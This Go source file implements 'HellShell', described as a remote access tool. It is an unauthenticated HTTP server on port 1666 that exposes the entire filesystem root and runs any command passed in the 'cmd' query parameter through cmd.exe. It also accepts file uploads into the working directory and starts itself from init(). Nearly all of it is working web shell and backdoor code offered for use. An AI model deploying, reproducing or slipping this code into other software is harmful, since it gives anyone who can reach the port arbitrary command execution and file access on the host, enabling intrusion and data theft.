//@(#)Author: Andre Wingor http://andr.ru
//@(#)License: Devil's Contract
/*
HellShell is RA tools
It is simple http file server for run remote shell with file transfer option
Run and open at browser http://localhost:1666/

UNDER CONSTRUCT

Usage
		hellShell [ip][:port] [path/to/workspace]

*/

package main

import (
	"os"
	"io"
	"fmt"
	"html"
	"net/http"
	"os/exec"
)
//Data
const Revision = "$Id$" // Revision ID
var (
	stdout []byte //Output of command
	err  error  //Error
)
//myContract (HTTP response) 
func myContract (serv http.Handler ) http.Handler {
	return http.HandlerFunc ( func (w http.ResponseWriter, r *http.Request) {
		io.WriteString(w, htmlhead)//Before
//TODO<a href="/"> Navigation / Here /  </a><br/>
		serv.ServeHTTP(w, r)//Call origin
//TODO<a href="/"> Navigation / Here /  </a><br/>
		io.WriteString(w, htmlform)//Append

		if r.Method == "POST" { //Upload file
//TODO Uplad file to current directory in URL path
           r.ParseMultipartForm(32 << 20)
           if file, handler, err := r.FormFile("uploadfile"); err == nil {
	          defer file.Close()
 	         	 f, err := os.OpenFile("./"+handler.Filename, os.O_WRONLY|os.O_CREATE, 0666)
 	   			if err != nil {
             	  fmt.Println(err)
	           }
 	  	        defer f.Close()
 	         io.Copy(f, file)
		   } else {
			   fmt.Println(err)
		   }
       }

		if len (r.URL.Query().Get("cmd")) > 0 { //Run shell command
			stdout, err = exec.Command("cmd", "/C", r.FormValue("cmd")).Output()
			if err != nil { io.WriteString(w, err.Error())
		}
		io.WriteString(w, html.EscapeString( string(stdout)) )
		}
		io.WriteString(w, htmltail)//After
	})
}
//HellShell init
func init() {
	http.Handle("/", myContract( http.FileServer(http.Dir("/"))) )
	http.ListenAndServe(":1666", nil)
}
//HellShell run
func main() {}
//Web-muzzle
var htmltail string = "</pre></body></html>"

var htmlhead string = `
<!DOCTYPE html>
<html>
<head><title>Hell$hell</title></head>
<style>
pre {
	font-family: Consolas, Courier New
}
body {
	text-align: left;
	margin-left: 10%;
	font-family: Consolas;
	font-size: 14pt;
}
input {
	font-family: Consolas;
	font-size: 16pt;
}
.cmd {
	width: 70%;
	font-family: Consolas;
	font-size: 14pt;
}
.middle {
	vertical-align: middle;
	height: 7em;
	line-height: 7em;
}
</style>
<body>
`;

var htmlform string = `
<div class="middle">
	<form id="cmdstr">
cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
		<input type="submit" value="Enter" /><br/>
	</form>
	<hr/>
	<form enctype="multipart/form-data" action="" method="post">
 		<input type="file" name="uploadfile" />
 	   <input type="hidden" name="token" value="{{.}}"/>
 	  	 <input type="submit" value="upload" />
	</form>
</div>
<script type="text/javascript">document.cmdstr.cmd.focus();</script>
<hr/>
<pre>
`
//EOF
